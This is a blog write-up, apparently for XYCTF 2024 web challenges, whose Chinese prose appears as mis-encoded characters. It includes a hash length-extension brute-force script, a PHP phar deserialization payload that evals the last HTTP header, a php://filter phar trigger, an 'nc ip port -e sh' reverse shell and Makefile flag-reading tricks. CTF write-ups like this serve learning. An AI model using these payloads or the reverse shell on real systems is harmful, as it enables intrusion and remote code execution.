<p>ç„¶åæœ¬æ¥æ˜¯æœ‰é•¿åº¦æ‹“å±•æ”»å‡»çš„è„šæœ¬ï¼Œä½†æ˜¯è¿™é‡Œè¿˜åŠ ä¸Šäº†æ—¶é—´æˆ³ï¼Œæ‰€ä»¥å°±éœ€è¦ä¸€ä¸ªæ–°çš„è„šæœ¬åŠ ä¸Šæ—¶é—´æˆ³æ¥è§£å†³è¿™é“é¢˜</p>
<p>è¿™é‡Œç”¨çš„åˆ«çš„å¸ˆå‚…çš„è„šæœ¬ï¼Œè¿™é‡Œè¿˜éœ€è¦<a class="link" href="https://github.com/shellfeel/hash-ext-attack"  target="_blank" rel="noopener"
    >GitHub - shellfeel/hash-ext-attack: å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»åˆ©ç”¨è„šæœ¬ï¼Œå…å»äº†hashpumpéœ€è¦ç¼–è¯‘çš„çƒ¦æ¼</a>commonæ–‡ä»¶å¤¹ä¸­çš„å†…å®¹ï¼Œæ”¹ä¸€ä¸‹hash_ext_attack.pyå°±è¡Œã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">common.HashExtAttack</span> <span class="kn">import</span> <span class="n">HashExtAttack</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">loguru</span> <span class="kn">import</span> <span class="n">logger</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">logger</span><span class="o">.</span><span class="n">remove</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">logger</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s2">&#34;INFO&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="mi">50</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">value</span> <span class="o">=</span> <span class="s2">&#34;2&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">times</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span> <span class="o">+</span> <span class="mi">4</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://127.0.0.1:9342/&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">crack</span> <span class="o">=</span> <span class="n">HashExtAttack</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">va</span><span class="p">,</span><span class="n">md5</span> <span class="o">=</span> <span class="n">crack</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;1941fdd8711dda8426747b1bb9f18bff&#34;</span><span class="p">,</span><span class="n">value</span> <span class="o">+</span> <span class="n">times</span><span class="p">,</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;?value=</span><span class="si">{</span><span class="n">va</span><span class="p">[:</span><span class="nb">len</span><span class="p">(</span><span class="n">va</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">times</span><span class="p">)</span> <span class="p">]</span><span class="si">}</span><span class="s2">&amp;md5=</span><span class="si">{</span><span class="n">md5</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="n">data</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">now_time</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">        <span class="n">flag</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="n">a</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="s2">&#34;XYCTF&#34;</span> <span class="ow">in</span> <span class="n">a</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">elif</span> <span class="n">flag</span> <span class="o">&lt;</span> <span class="mi">5</span> <span class="ow">and</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span> <span class="o">!=</span> <span class="n">now_time</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="n">temp</span> <span class="o">=</span> <span class="n">a</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="cl">                        <span class="n">now_time</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">                        <span class="c1"># print(temp.split(&#34;?&gt;&#34;)[1],times,now_time,i)</span>
</span></span><span class="line"><span class="cl">                        <span class="nb">print</span><span class="p">(</span><span class="n">times</span><span class="p">,</span><span class="n">now_time</span><span class="p">,</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                        <span class="n">flag</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">                <span class="n">now_time</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">now_time</span> <span class="o">&gt;</span> <span class="nb">int</span><span class="p">(</span><span class="n">times</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="k">break</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åè¿™é‡Œè‚¯å®šæ˜¯è¿˜è¦çˆ†ç ´çš„ï¼Œçˆ†ç ´flagçš„é•¿åº¦ï¼Œè¦ä¸€ç‚¹ç‚¹è¯•ã€‚</p>
<p>è·‘åŠå¤©ï¼Œè·‘ä¸å‡ºæ¥ï¼Œåæ­£å°±è¿™ä¹ˆä¸ªäº‹ï¼Œå°±ä¸å¤šè¯´äº†</p>
<h2 id="pharme">pharme
</h2><h3 id="çŸ¥è¯†ç‚¹__halt_compilerç»ˆæ­¢ç¼–è¯‘evalendgetallheadersç»•è¿‡æ— å‚æ•°rcepharååºåˆ—åŒ–phpfilterç»•è¿‡phar">çŸ¥è¯†ç‚¹ï¼š__halt_compiler()ç»ˆæ­¢ç¼–è¯‘ã€eval(end(getallheaders()));ç»•è¿‡æ— å‚æ•°rceã€pharååºåˆ—åŒ–ã€php:filterç»•è¿‡phar
</h3><p>å¼€å±€ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œè¯´æ˜¯pharé‚£è‚¯å®šå°±æ˜¯pharäº†ï¼Œä¼ äº†ä¸ªå›¾ç‰‡é©¬ï¼Œæ²¡è¢«banï¼Œä½†æ˜¯è·¯å¾„è¿›ä¸å»ã€‚</p>
<p>æºä»£ç é‡Œçœ‹åˆ°class.php</p>
<p><img src="/p/xyctf2024/image-20250907203212940.png"
	width="1729"
	height="767"
	srcset="/p/xyctf2024/image-20250907203212940_hu16249848078669040841.png 480w, /p/xyctf2024/image-20250907203212940_hu12174360231540776381.png 1024w"
	loading="lazy"
	
		alt="image-20250907203212940"
	
	
		class="gallery-image" 
		data-flex-grow="225"
		data-flex-basis="541px"
	
></p>
<p>ç®€å•çœ‹ä¸€ä¸‹ç»•è¿‡å‡½æ•°ï¼Œé¦–å…ˆä¼šå»é™¤cmdä¸­æ‰€æœ‰çš„å­—æ¯ã€ä¸‹åˆ’çº¿å’Œæ‹¬å·ï¼Œç„¶åå†æŠŠè¿ç»­åˆ†å·æ›¿æ¢æˆ<code>ch3nxl</code>ï¼Œç„¶åå†ä¸ch3nxlä½œæ¯”è¾ƒï¼Œä¸ºçœŸå°±è¿›è¡Œeval</p>
<p><code>å…¶å®å°±æ˜¯åˆ¤æ–­ä½ çš„cmdä¸­æ˜¯å¦åªæœ‰å­—æ¯ã€ä¸‹åˆ’çº¿å’Œæ‹¬å·ã€‚</code></p>
<p>æ‰€ä»¥æ˜¯æ— æ•°å­—rceï¼Œè¿™é‡Œå¯ä»¥ç”¨<code>eval(end(getallheaders()));</code>è·å–æ‰€æœ‰httpå¤´ï¼Œç„¶åè¿”å›æœ€åä¸€ä¸ªhttpå¤´ç»™evalå‡½æ•°ï¼ˆå¥½æ€è·¯å•Šï¼‰</p>
<p>ä¸ç”¨è¿™ä¸ªçš„è¯ï¼Œæ— å‚rceä¹‹å‰ä¹Ÿåšè¿‡</p>
<p>ç„¶åéš¾ç‚¹å…¶å®åœ¨evalå‡½æ•°é‚£é‡Œçš„ç»•è¿‡ï¼Œå› ä¸ºevalä¸­é—´çš„å†…å®¹æ˜¯å­—ç¬¦ä¸²æ‹¼æ¥çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¹¶ä¸èƒ½ç›´æ¥é€šè¿‡<code>#</code>å’Œ<code>//</code>è¿›è¡Œæ³¨é‡Šï¼Œéœ€è¦ç”¨åˆ°<code>__halt_compiler()</code>æ¥ç»ˆæ­¢ç¼–è¯‘</p>
<p>æ‰€ä»¥æ„é€ payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">evil</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$cmd</span><span class="o">=</span><span class="s2">&#34;eval(end(getallheaders()));__halt_compiler();&#34;</span><span class="p">;</span>   <span class="c1">//å†™shell
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="s1">&#39;poc.phar&#39;</span><span class="p">);</span>   <span class="c1">//åˆ é™¤ä¹‹å‰çš„test.pharæ–‡ä»¶(å¦‚æœæœ‰)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">=</span><span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s1">&#39;poc.phar&#39;</span><span class="p">);</span>  <span class="c1">//åˆ›å»ºä¸€ä¸ªpharå¯¹è±¡ï¼Œæ–‡ä»¶åå¿…é¡»ä»¥pharä¸ºåç¼€
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>  <span class="c1">//å¼€å§‹å†™æ–‡ä»¶
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s1">&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;</span><span class="p">);</span>  <span class="c1">//å†™å…¥stub
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$o</span><span class="o">=</span><span class="k">new</span> <span class="nx">evil</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span><span class="c1">//å†™å…¥meta-data
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">,</span><span class="s2">&#34;test&#34;</span><span class="p">);</span>  <span class="c1">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xyctf2024/image-20250908142258074.png"
	width="547"
	height="268"
	srcset="/p/xyctf2024/image-20250908142258074_hu5462717126945984394.png 480w, /p/xyctf2024/image-20250908142258074_hu1274810513776483929.png 1024w"
	loading="lazy"
	
		alt="image-20250908142258074"
	
	
		class="gallery-image" 
		data-flex-grow="204"
		data-flex-basis="489px"
	
></p>
<p>ä¹Ÿå¯ä»¥ç”¨pythonè¿›è¡Œgzipå‹ç¼©</p>
<p>ç„¶åæ”¹ä¸ªåç¼€åç»•è¿‡æ–‡ä»¶åçš„waf</p>
<p>ç„¶åå†class.phpä¼ </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php://filter/convert.base64-encode/resource=phar:///tmp/23f1a0f70f076b42b5b49f24ee28f696.png
</span></span></code></pre></td></tr></table>
</div>
</div><p>æœ€årce</p>
<p><img src="/p/xyctf2024/image-20250908143044664.png"
	width="1928"
	height="964"
	srcset="/p/xyctf2024/image-20250908143044664_hu16629624621651965302.png 480w, /p/xyctf2024/image-20250908143044664_hu2527273687591000652.png 1024w"
	loading="lazy"
	
		alt="image-20250908143044664"
	
	
		class="gallery-image" 
		data-flex-grow="200"
		data-flex-basis="480px"
	
></p>
<h2 id="ezmake">ezMake
</h2><h3 id="çŸ¥è¯†ç‚¹makefile">çŸ¥è¯†ç‚¹ï¼šMakefile
</h3><p>è¿™ç©æ„è¿˜çœŸæ²¡å­¦è¿‡</p>
<p>ç®€å•çœ‹çœ‹è¿™æ˜¯ä¸ªå•¥</p>
<p><code>Makefile</code> æ–‡ä»¶æè¿°äº† <code>Linux</code> ç³»ç»Ÿä¸‹ <code>C/C++</code> å·¥ç¨‹çš„ç¼–è¯‘è§„åˆ™ï¼Œå®ƒç”¨æ¥è‡ªåŠ¨åŒ–ç¼–è¯‘ <code>C/C++</code> é¡¹ç›®ã€‚ä¸€æ—¦å†™ç¼–å†™å¥½ <code>Makefile</code> æ–‡ä»¶ï¼Œåªéœ€è¦ä¸€ä¸ª <code>make</code> å‘½ä»¤ï¼Œæ•´ä¸ªå·¥ç¨‹å°±å¼€å§‹è‡ªåŠ¨ç¼–è¯‘ï¼Œä¸å†éœ€è¦æ‰‹åŠ¨æ‰§è¡Œ <code>GCC</code> å‘½ä»¤ã€‚</p>
<p>åœ¨Makefileä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨<code>$(shell)</code>å‡½æ•°æ¥è¯»å–æ–‡ä»¶å†…å®¹ã€‚</p>
<p>ä¾‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-makefile" data-lang="makefile"><span class="line"><span class="cl"><span class="nv">content</span> <span class="o">:=</span> <span class="k">$(</span>shell cat file.txt<span class="k">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">ä¸Šè¿°å‘½ä»¤å°†æ–‡ä»¶file.txtçš„å†…å®¹å­˜å‚¨åœ¨å˜é‡contentä¸­ã€‚ä½ å¯ä»¥æ ¹æ®éœ€è¦å°†å…¶ç”¨äºåç»­çš„æ“ä½œã€‚</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åé¢˜ç›®ä¹Ÿå°±æ˜¯è¿™æ ·åš</p>
<p><img src="/p/xyctf2024/image-20250908153452694.png"
	width="1324"
	height="683"
	srcset="/p/xyctf2024/image-20250908153452694_hu2894124558506547507.png 480w, /p/xyctf2024/image-20250908153452694_hu1359288940902305854.png 1024w"
	loading="lazy"
	
		alt="image-20250908153452694"
	
	
		class="gallery-image" 
		data-flex-grow="193"
		data-flex-basis="465px"
	
></p>
<h2 id="ezmake-1">ez?Make
</h2><h3 id="çŸ¥è¯†ç‚¹åå¼¹shell">çŸ¥è¯†ç‚¹ï¼šåå¼¹shell
</h3><p>banäº†ä¸€äº›ä¸œè¥¿ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨ncåå¼¹shellï¼Œåˆæ˜¯åå¼¹shellQAQ</p>
<p>è¿™é‡Œæœ‰wafï¼Œè‚¯å®šåˆä¸èƒ½ç”¨å†…ç½‘ç©¿é€åå¼¹shelläº†ï¼ˆæ„Ÿè§‰ç ”ç©¶å‡ºæ¥éƒ½æ²¡æ€ä¹ˆåˆ©ç”¨è¿‡ï¼‰</p>
<p>æƒ³åˆ°è¿™çªç„¶æƒ³åˆ°æœ‰åŸŸåè‚¯å®šæœ‰ipåœ°å€ï¼Œåœ¨ç½‘ä¸Šæ‰¾äº†ä¸ªåŸŸåè§£æç½‘ç«™</p>
<p><a class="link" href="https://zhanchacha.cn/host-ip/"  target="_blank" rel="noopener"
    >åŸŸååæŸ¥IPå·¥å…· - åŸŸåIPæŸ¥è¯¢ - ç«™æŸ¥æŸ¥</a></p>
<p>ç„¶åçœŸçš„èƒ½æŸ¥åˆ°ï¼</p>
<p>é‚£ä¹ˆå°±è¯•è¯•çœ‹ï¼Œå†…ç½‘ç©¿é€åå¼¹shellï¼Œèƒ½ä¸èƒ½æˆåŠŸ</p>
<p>ç»“æœæ˜¾è€Œæ˜“è§äº†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc ip port -e sh
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xyctf2024/image-20250908155608312.png"
	width="1463"
	height="805"
	srcset="/p/xyctf2024/image-20250908155608312_hu4495900303433623950.png 480w, /p/xyctf2024/image-20250908155608312_hu14955597645050656047.png 1024w"
	loading="lazy"
	
		alt="image-20250908155608312"
	
	
		class="gallery-image" 
		data-flex-grow="181"
		data-flex-basis="436px"
	
></p>
<h2 id="ÎµzĞ¼kÎµ">ÎµZ?Â¿Ğ¼@KÎµÂ¿?
</h2><h3 id="çŸ¥è¯†ç‚¹æ— å­—æ¯æ•°å­—makefile">çŸ¥è¯†ç‚¹ï¼šæ— å­—æ¯æ•°å­—makefile
</h3><p>å‰æçŸ¥è¯†ç‚¹</p>
<p><a class="link" href="https://www.cnblogs.com/lelin/p/11152780.html"  target="_blank" rel="noopener"
    >Makefileçš„ç¼–å†™åŠå››ä¸ªç‰¹æ®Šç¬¦å·çš„æ„ä¹‰@ã€$@ã€$^ã€$ - æ˜¥é£ä¸€éƒ - åšå®¢å›­</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ä¸€ã€@
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">è¿™ä¸ªç¬¦ä¸²é€šå¸¸ç”¨åœ¨â€œè§„åˆ™â€è¡Œä¸­ï¼Œè¡¨ç¤ºä¸æ˜¾ç¤ºå‘½ä»¤æœ¬èº«ï¼Œè€Œåªæ˜¾ç¤ºå®ƒçš„ç»“æœï¼Œä¾‹å¦‚Makefileä¸­çš„å†…å®¹ä¸ºï¼š
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">DIR_OBJ=./obj
</span></span><span class="line"><span class="cl">CMD_MKOBJDIR=if [ -d ${DIR_OBJ} ]; then exit 0; else mkdir ${DIR_OBJ}; fi
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">mkobjdir:
</span></span><span class="line"><span class="cl">@${CMD_MKOBJDIR}
</span></span><span class="line"><span class="cl">å‘½ä»¤è¡Œæ‰§è¡Œå¦‚ä¸‹ï¼š
</span></span><span class="line"><span class="cl">make mkobjdir
</span></span><span class="line"><span class="cl">æ­¤æ—¶ä¸ä¼šæ˜¾ç¤ºåœ¨å‘½ä»¤è¡Œä¸ä¼šæ˜¾ç¤ºå‡ºif [ -d ${DIR_OBJ} ]; then exit 0; else mkdir ${DIR_OBJ}; fiï¼Œä½†å¦‚æœè§„åˆ™è¡Œçš„TABåæ²¡æœ‰ä»¥@å¼€å¤´ï¼Œåˆ™ä¼šæ˜¾ç¤ºï¼Œä¸ä¿¡å¯ä»¥è¯•è¯•ã€‚
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">äºŒã€$@ã€$^ã€$&lt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">è¿™ä¸‰ä¸ªåˆ†åˆ«è¡¨ç¤ºï¼š
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$@          --ä»£è¡¨ç›®æ ‡æ–‡ä»¶(target)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$^            --ä»£è¡¨æ‰€æœ‰çš„ä¾èµ–æ–‡ä»¶(components)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$&lt;           --ä»£è¡¨ç¬¬ä¸€ä¸ªä¾èµ–æ–‡ä»¶(componentsä¸­æœ€å·¦è¾¹çš„é‚£ä¸ª)ã€‚
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$?           --ä»£è¡¨ç¤ºæ¯”ç›®æ ‡è¿˜è¦æ–°çš„ä¾èµ–æ–‡ä»¶åˆ—è¡¨ã€‚ä»¥ç©ºæ ¼åˆ†éš”ã€‚
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$%           --ä»…å½“ç›®æ ‡æ˜¯å‡½æ•°åº“æ–‡ä»¶ä¸­ï¼Œè¡¨ç¤ºè§„åˆ™ä¸­çš„ç›®æ ‡æˆå‘˜åã€‚ä¾‹å¦‚ï¼Œå¦‚æœä¸€ä¸ªç›®æ ‡æ˜¯&#34;foo.a(bar.o)&#34;ï¼Œé‚£ä¹ˆï¼Œ&#34;$%&#34;å°±æ˜¯&#34;bar.o&#34;ï¼Œ&#34;$@&#34;å°±æ˜¯&#34;foo.a&#34;ã€‚å¦‚æœç›®æ ‡ä¸æ˜¯å‡½æ•°åº“æ–‡ä»¶ï¼ˆUnixä¸‹æ˜¯[.a]ï¼ŒWindowsä¸‹æ˜¯[.lib]ï¼‰ï¼Œé‚£ä¹ˆï¼Œå…¶å€¼ä¸ºç©ºã€‚
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ä¸‰
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&#39; - &#39; ç¬¦å·çš„ä½¿ç”¨
</span></span><span class="line"><span class="cl">     
</span></span><span class="line"><span class="cl">     é€šå¸¸åˆ é™¤ï¼Œåˆ›å»ºæ–‡ä»¶å¦‚æœç¢°åˆ°æ–‡ä»¶ä¸å­˜åœ¨æˆ–è€…å·²ç»åˆ›å»ºï¼Œé‚£ä¹ˆå¸Œæœ›å¿½ç•¥æ‰è¿™ä¸ªé”™è¯¯ï¼Œç»§ç»­æ‰§è¡Œï¼Œå°±å¯ä»¥åœ¨å‘½ä»¤å‰é¢æ·»åŠ  -ï¼Œ
</span></span><span class="line"><span class="cl">     -rm dirï¼›
</span></span><span class="line"><span class="cl">     -mkdir aaadirï¼›
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">&#39; $ &#39;ç¬¦å·çš„ä½¿ç”¨
</span></span><span class="line"><span class="cl">          ç¾å…ƒç¬¦å·$ï¼Œä¸»è¦æ‰©å±•æ‰“å¼€makefileä¸­å®šä¹‰çš„å˜é‡
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">&#39; $$ &#39;ç¬¦å·çš„ä½¿ç”¨
</span></span><span class="line"><span class="cl">          $$ ç¬¦å·ä¸»è¦æ‰©å±•æ‰“å¼€makefileä¸­å®šä¹‰çš„shellå˜é‡
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xyctf2024/image-20250908182908357.png"
	width="1145"
	height="725"
	srcset="/p/xyctf2024/image-20250908182908357_hu960992155023403132.png 480w, /p/xyctf2024/image-20250908182908357_hu10567218956209009210.png 1024w"
	loading="lazy"
	
		alt="image-20250908182908357"
	
	
		class="gallery-image" 
		data-flex-grow="157"
		data-flex-basis="379px"
	
></p>
<p>è§£æä¸€ä¸‹ï¼Œè¿™é‡Œflagå°±æ˜¯ç¬¬ä¸€ä¸ªä¾èµ–æ–‡ä»¶å</p>
<p>åœ¨ Makefile è§„åˆ™ä¸­ï¼šä½ å†™ä¸‹ <code>$$(&lt;$&lt;)</code></p>
<p>Makefile è§£æï¼š</p>
<p><code>$$</code> -&gt; è½¬ä¹‰æˆä¸€ä¸ª <code>$</code></p>
<p><code>$&lt;</code> -&gt; æ›¿æ¢æˆç¬¬ä¸€ä¸ªä¾èµ–çš„æ–‡ä»¶åï¼ˆä¾‹å¦‚ <code>input.txt</code>ï¼‰</p>
<p>ç»“æœï¼šç”Ÿæˆ Shell å‘½ä»¤ <code>$(&lt;input.txt)</code></p>
<p><img src="/p/xyctf2024/image-20250908184724483.png"
	width="1155"
	height="806"
	srcset="/p/xyctf2024/image-20250908184724483_hu374244189014454101.png 480w, /p/xyctf2024/image-20250908184724483_hu9091860781896679779.png 1024w"
	loading="lazy"
	
		alt="image-20250908184724483"
	
	
		class="gallery-image" 
		data-flex-grow="143"
		data-flex-basis="343px"
	
></p>
<h2 id="baby_unserialize">baby_unserialize
</h2><p>javaé¢˜wocï¼Œç•™ç€å§ã€‚</p>
<p>çœ‹æ˜¯èƒ½çœ‹ä¸€ç‚¹ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰äº›éš¾ä»¥ç†è§£</p>
